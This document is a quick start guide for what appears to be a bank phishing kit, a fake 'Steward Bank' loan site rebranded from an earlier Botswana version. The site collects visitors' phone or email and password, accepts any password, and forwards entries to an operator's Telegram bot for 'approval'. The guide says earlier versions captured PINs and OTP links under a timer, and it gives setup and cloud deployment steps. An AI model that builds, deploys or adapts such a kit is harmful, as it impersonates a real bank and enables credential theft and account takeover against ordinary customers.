# Steward Bank - Quick Start Guide 🚀

Get your Steward Bank loan system running in 5 minutes!

## 🎯 What You're Getting

✅ **Steward Bank** branded loan application  
✅ **Red/Maroon** professional theme  
✅ **USD Currency** throughout  
✅ **Zimbabwe** market ready  
✅ **No OTP** - Simple account verification  
✅ **Telegram** admin notifications

## 🚀 5-Minute Setup

### Step 1: Extract Files (30 seconds)
```bash
cd steward-bank-loan
```

### Step 2: Install Dependencies (2 minutes)
```bash
npm install
```

### Step 3: Create .env File (1 minute)
Create a file named `.env`:
```env
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/stewardbank
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
SUPER_ADMIN_CHAT_ID=YOUR_TELEGRAM_CHAT_ID
PORT=3000
```

### Step 4: Get Telegram Chat ID (1 minute)
```bash
node get-chat-id.js
```
Then send ANY message to your Telegram bot and copy the Chat ID shown.

### Step 5: Start Server (30 seconds)
```bash
npm start
```

Visit: **http://localhost:3000** 🎉

## ✨ Major Changes from Original

### ❌ REMOVED: OTP Verification
- No more 30-second timers
- No more verification links
- No more 5-digit codes

### ✅ NEW: Account Login
- Phone number OR email
- Password or PIN (any characters)
- Direct account verification
- Simpler for users!

## 🔄 New Application Flow

```
Landing Page → Application Form → Account Verification → Approval
                                   ↑
                          Phone/Email + Password
                          (NO OTP STEP!)
```

## 💰 Currency Changes

All amounts are now in **USD ($)**:

| Feature | Old (Pula) | New (USD) |
|---------|-----------|-----------|
| Min Loan | P 500 | $100 |
| Max Loan | P 50,000 | $10,000 |
| Example | P 5,000 | $1,000 |

## 🎨 Design Updates

**Colors:**
- Primary: Red (#C41E3A)
- Accent: Maroon (#8B0000)
- Gold highlights (#FFD700)

**Branding:**
- 🏦 Steward Bank logo
- Zimbabwe focus
- RBZ regulated badges

## 🧪 Test the System

1. **Open** http://localhost:3000
2. **Calculate** a loan (try $1,000 for 12 months)
3. **Apply** with test information
4. **Verify** with phone/email + password:
   - Phone: `0771234567` OR Email: `test@example.com`
   - Password: `TestPass123` (any characters work!)
5. **Admin** checks Telegram for notification
6. **Approve** the verification
7. **See** approval page!

## 📱 Verification Example

**Old System (Removed):**
```
Enter PIN: [1] [2] [3] [4]
↓
Wait for OTP link
↓
Paste link (30 seconds!)
```

**New System:**
```
Phone/Email: 0771234567
Password: MyPassword123
↓
Admin approves
↓
Done! ✅
```

## 🎯 Quick Tips

### Update Loan Limits
Edit `landing-script.js` and `index.html`:
```javascript
min="100" max="10000"  // Change these values
```

### Change Interest Rate
Edit `landing-script.js` and `approval-script.js`:
```javascript
const annualRate = 0.12;  // Change to your rate
```

### Add More Admins
Edit `database.js`:
```javascript
{
    id: 'admin_zw_002',
    name: 'New Admin',
    email: 'admin@stewardbank.co.zw',
    telegramChatId: '123456789',
    status: 'active'
}
```

## 🌐 Deploy to Cloud

### Render.com (FREE)
1. Push to GitHub
2. Create new Web Service on Render
3. Connect repository
4. Add environment variables
5. Deploy! (automatic)

### Heroku
```bash
heroku create steward-bank-loan
git push heroku main
heroku config:set MONGODB_URI=xxx
heroku config:set TELEGRAM_BOT_TOKEN=xxx
```

## 📊 What Changed?

✅ **Brand**: Max it BW → Steward Bank  
✅ **Currency**: Pula (P) → USD ($)  
✅ **Country**: Botswana → Zimbabwe  
✅ **Colors**: Orange/Blue → Red/Maroon  
✅ **Verification**: 4-digit PIN + OTP → Phone/Email + Password  
✅ **Phone Code**: +267 → +263

## ❓ Common Questions

**Q: Where is the OTP verification?**  
A: Removed! Now using direct account login.

**Q: What password can I use?**  
A: Any characters - no restrictions!

**Q: How do I add admins?**  
A: Edit `database.js` file.

**Q: Can I change the currency?**  
A: Yes, but requires changing `$` to your symbol throughout.

## 🎉 You're Ready!

Your Steward Bank loan system is now running!

**Need help?** Check README.md for detailed documentation.

---

**Steward Bank** 🏦 | **Zimbabwe** 🇿🇼 | **USD** 💵
